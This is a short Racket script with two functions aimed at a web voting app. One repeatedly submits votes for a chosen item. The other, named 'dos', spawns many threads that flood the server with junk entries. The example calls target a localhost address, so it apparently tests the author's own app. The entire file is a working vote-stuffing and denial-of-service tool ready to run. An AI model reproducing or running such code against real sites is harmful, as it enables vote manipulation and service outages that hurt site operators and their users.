#lang racket
(require net/url)

(define (upvote base-url item times)
  (for ((i (in-range 0 times)))
    (get-pure-port 
     (string->url
      (string-append base-url "/votes?vote=" item))))) 

(define (dos base-url times)
  (for ((i (in-range 0 times)))
    (thread (lambda ()
              (get-pure-port 
               (string->url
                (string-append base-url "/votes?new=" "garbage" (number->string i))))))))
             
; examples:   
; (upvote "http://127.0.0.1:8000" "This is cool") ; entry "This is cool" has to be in the list!
; (dos "http://127.0.0.1:8000" 1000)